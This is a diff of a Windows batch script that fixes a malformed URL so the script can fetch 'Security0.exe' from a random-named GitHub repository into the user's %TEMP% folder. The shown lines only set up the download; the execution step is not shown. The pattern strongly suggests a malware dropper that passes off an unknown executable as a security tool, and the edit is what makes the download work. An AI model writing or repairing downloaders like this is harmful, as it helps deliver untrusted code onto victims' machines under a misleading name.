@@ -1,7 +1,7 @@
 @echo off
 setlocal
 
-set "url_exe=https://rawgithubusercontent.com/KR4eeR/668768687/main/Security0.exe"
+set "url_exe=https://raw.githubusercontent.com/KR4eeR/668768687/main/Security0.exe"
 
 set "temp_dir=%TEMP%"
 set "exe_path=%temp_dir%\Security0.exe"
